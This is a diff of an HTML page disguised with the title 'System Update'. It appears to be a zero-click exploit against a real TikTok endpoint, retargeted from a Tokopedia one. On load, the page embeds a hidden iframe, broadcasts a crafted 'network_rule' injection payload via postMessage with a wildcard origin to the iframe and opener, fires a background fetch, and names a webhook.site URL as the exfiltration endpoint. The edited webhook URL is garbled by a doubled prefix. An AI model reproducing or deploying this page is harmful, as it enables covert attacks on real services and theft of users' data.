@@ -1,21 +1,21 @@
 <!DOCTYPE html>
 <html>
-<head><title>Loading...</title></head>
+<head><title>System Update</title></head>
 <body>
-    <iframe id="target" src="https://shop-id.tokopedia.com/v1/list" style="display:none;"></iframe>
+    <iframe id="target" src="https://mcs-sg.tiktokv.com/v1/list" style="display:none;"></iframe>
 
     <script>
         const targetFrame = document.getElementById('target');
-        const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e";
+        const webhook = "https://webhook.site/https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e";
 
         function sendExploit() {
             console.log("Attempting Zero-Click Injection...");
             
             const payload = {
-                source: "main_thread",
+                source: "main_thread", // Sesuai pns_logic.js baris awal
                 eventName: "network_rule",
                 data: [{
-                    ruleName: "zero_click_exfil",
+                    ruleName: "zero_click_pwn",
                     global: true,
                     conditions: [],
                     handlers: [{
@@ -27,20 +27,22 @@
                 }]
             };
 
-            // Kirim ke semua frame yang berhasil ter-load
+            // Kirim pesan ke semua window yang terbuka (broadcast style)
             targetFrame.contentWindow.postMessage(payload, "*");
+            
+            // Tambahan: Kirim ke opener juga kalau ada
+            if (window.opener) {
+                window.opener.postMessage(payload, "*");
+            }
         }
 
-        // Jalankan otomatis saat halaman dibuka
         targetFrame.onload = function() {
-            // Kasih jeda dikit biar SW siap
+            console.log("Iframe loaded successfully!");
             setTimeout(sendExploit, 2000);
             
-            // Setelah injeksi, kita paksa fetch dari background (Zero-Click)
+            // Trigger fetch otomatis buat aktivasi rules
             setTimeout(() => {
-                // Kita coba pemicu fetch lewat image tag ke domain target
-                const img = new Image();
-                img.src = "https://shop-id.tokopedia.com/v1/list?trigger=" + Math.random();
+                fetch("https://mcs-sg.tiktokv.com/v1/list", {mode: 'no-cors'});
             }, 4000);
         };
     </script>
